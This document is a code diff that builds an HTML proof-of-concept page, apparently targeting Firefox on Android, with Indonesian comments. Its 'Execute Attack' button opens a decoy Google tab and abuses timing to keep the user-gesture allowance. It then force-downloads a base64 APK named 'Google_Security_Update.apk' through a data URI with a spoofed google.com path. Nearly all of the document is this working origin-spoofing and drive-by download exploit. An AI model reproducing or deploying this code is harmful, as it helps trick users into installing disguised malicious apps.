@@ -1,30 +1,47 @@
-function startExploit() {
-    const status = document.getElementById('status');
-    const apkPayload = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";
-    const mimeType = "application/vnd.android.package-archive";
-    const spoofPath = "/\\\\\\/.google.com/application/x-msdownload";
-    const finalURL = `data:${mimeType};${spoofPath};base64,${apkPayload}`;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Origin Spoofing</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 50px; }
+        button { background: #ff5252; color: white; padding: 20px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; }
+        #status { margin-top: 20px; color: #00e676; }
+    </style>
+</head>
+<body>
 
-    // 1. Langsung buka tab Google (Ini menghabiskan "User Gesture" pertama)
-    status.innerText = "Status: Redirecting to Google...";
-    const decoyWin = window.open("https://www.google.com", "_blank");
+    <h2>Advanced Firefox PoC</h2>
+    <button onclick="startExploit()">Execute Attack</button>
+    <div id="status">Status: Ready</div>
 
-    // 2. Trik: Gunakan Blob URL dan deteksi visibilitas
-    // Agar Android mengizinkan download setelah window.open, 
-    // kita harus memicu download sesaat sebelum atau tepat saat tab berpindah.
-    
-    const a = document.createElement("a");
-    a.href = finalURL;
-    a.download = "Google_Security_Update.apk";
-    document.body.appendChild(a);
+    <script>
+        function startExploit() {
+            const status = document.getElementById('status');
+            const apkPayload = "UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAACQAAAGhlbGxvLnR4dFV0RAsAA2SjdWZko3VmdXgLAAEE6AMAAAToAwAAUEsBAhQDFAAAAAgAAAAAAAAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAaGVsbG8udHh0VXRFAANZp3VmdKd1ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAEUAAABZAAAAAAA=";
+            const mimeType = "application/vnd.android.package-archive";
+            const spoofPath = "/\\\\\\/.google.com/application/x-msdownload";
+            const finalURL = `data:${mimeType};${spoofPath};base64,${apkPayload}`;
 
-    // Gunakan requestAnimationFrame untuk mengeksekusi download 
-    // tepat di frame berikutnya setelah window.open
-    requestAnimationFrame(() => {
-        setTimeout(() => {
-            a.click();
-            document.body.removeChild(a);
-            status.innerText = "Status: Exploit Triggered.";
-        }, 500); // Delay kecil (500ms) biasanya masih ditoleransi oleh Firefox Android
-    });
-}
+            status.innerText = "Status: Opening Google...";
+            
+            // Membuka tab Google
+            window.open("https://www.google.com", "_blank");
+
+            // Menggunakan requestAnimationFrame agar tetap dianggap sebagai User Gesture
+            requestAnimationFrame(() => {
+                setTimeout(() => {
+                    const a = document.createElement("a");
+                    a.href = finalURL;
+                    a.download = "Google_Security_Update.apk";
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    status.innerText = "Status: Exploit Triggered.";
+                }, 500); 
+            });
+        }
+    </script>
+</body>
+</html>
